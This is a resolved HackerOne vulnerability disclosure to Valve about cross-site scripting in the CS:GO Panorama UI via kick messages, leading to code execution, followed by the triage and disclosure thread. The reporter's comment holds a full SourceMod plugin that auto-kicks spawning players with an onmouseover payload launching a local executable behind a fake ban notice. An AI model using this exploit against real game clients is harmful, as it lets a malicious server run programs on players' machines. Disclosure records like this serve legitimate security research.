---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/code-injection
  - env/web
substate: "resolved"
weakness: "Code Injection"
enriched: true
date: 2019-10-08
submitted: 2019-06-29T07:04:48.145Z
bounty_usd: null
votes: 420
cve: []
program: "[[programs/valve|Valve]]"
reporter: "shayhelman"
source: "https://hackerone.com/reports/631956"
title: "Panorama UI XSS leads to Remote Code Execution via Kick/Disconnect Message"
---
# Panorama UI XSS leads to Remote Code Execution via Kick/Disconnect Message

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 420 | **Program:** Valve | **Disclosed:** 2019-10-08

- Report: [https://hackerone.com/reports/631956](https://hackerone.com/reports/631956)
- CWE: Code Injection
- Submitted: 2019-06-29T07:04:48.145Z

## Timeline

- **Report Filed**
- **2019-07-01** @orangeband: Hi @shayhelman,

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Kind regards,
@orangeband
- **Report Needs More Info**
- **Report New**
- **2019-07-03** @shayhelman: Regarding your comment on the auto-kick that an attacker would set up, we have made a plugin that will do just that. F521670
Again place the file in the SourceMod plugins folder and restart the server.

The plugin waits for the victim to choose a team and spawns in-game, then initiates a kick. This is done in order to ensure that the victim's mouse is already hovering over our payload, making this exploit require no user interaction to trigger.
```cpp
#include <sourcemod>

#pragma semicolon 1
#pragma newdecls required

// Create hook event for when a player spawns
public void OnPluginStart()
{
    HookEvent("player_spawned", Event_PlayerSpawned);
}

// When the event gets fired create a 0.1 second timer
public Action Event_PlayerSpawned(Event event, const char[] name, bool dontBroadcast)
{
    int userid = event.GetInt("userid");
    CreateTimer(0.1, DoKick, userid);
    return Plugin_Continue;
}

// Do the actual kick once the timer is over
public Action DoKick(Handle timer, int userid)
{
    // We have to validate the client before doing anything else we might crash
    int client = GetClientOfUserId(userid);
    if (client <= 0 || client > MAXPLAYERS || IsFakeClient(client)) {
        return Plugin_Continue;
    }

    // Kick with malicious message
    KickClient(client, "<a onmouseover=\"javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')\">-------------------------\nBANNED\n-------------------------\n\nYour account has been banned from this community.\n\nThe ban is non negotiable</a>");
    return Plugin_Continue;
}
```
Here is a video of the autokick in action:
{F521677}
- **2019-07-03** @h1_analyst_everton: @shayhelman 

Thanks for the added info. I'll escalate this to Valve's team and we will get back to you as soon as there are any updates.
- **2019-07-18** @shayhelman: Any updates on this issue? Also, will this report be marked as triaged?
- **2019-07-25** @shayhelman: Just to clarify, this report has been triaged correct? If so, will the status be changed as such?

Thank you,
shay
- **2019-08-01** @h1_analyst_ava: Hi @shayhelman,
The report is still under review by the internal team and has not been confirmed as valid yet. As soon as we can provide you with those updates we will let you know. Thank you for you patience on this.
@sodacan
- **2019-08-29** @shayhelman: Hello,

Any updates? I've noticed that this issue has been resolved in a recent update [here](https://blog.counter-strike.net/index.php/2019/08/25353/) but no response on this report.

Thanks,
shay
- **Bounty Awarded**
- **Report Resolved**
- **Agreed On Going Public**
- **2019-10-08** @percybysshe: Hi, sorry for the late response on your disclosure request. If you use the h1 'request disclosure' feature you might get faster response on those than you get by leaving a comment.

After we ship a mitigation, we generally favor disclosing bugs. Just let us know if you have a timing request for disclosure or if we should just click the disclose button.
- **2019-10-08** @shayhelman: Hmm that's weird, on my end it shows as `shayhelman requested to disclose this report.` for the last comment I sent. The current option for this report is to cancel the disclosure request. Should I cancel and re-request the disclosure?
- **2019-10-08** @percybysshe: Oh whoops, you're totally right. That's an error on my part, I must have been looking at the wrong browser tab or something. In that case, apologies for sitting on it for so long.

Just let us know if you have any timing restrictions and we'll disclose.
- **2019-10-08** @shayhelman: I am fine if you disclose right now, thanks.
- **Agreed On Going Public**
- **Report Became Public**
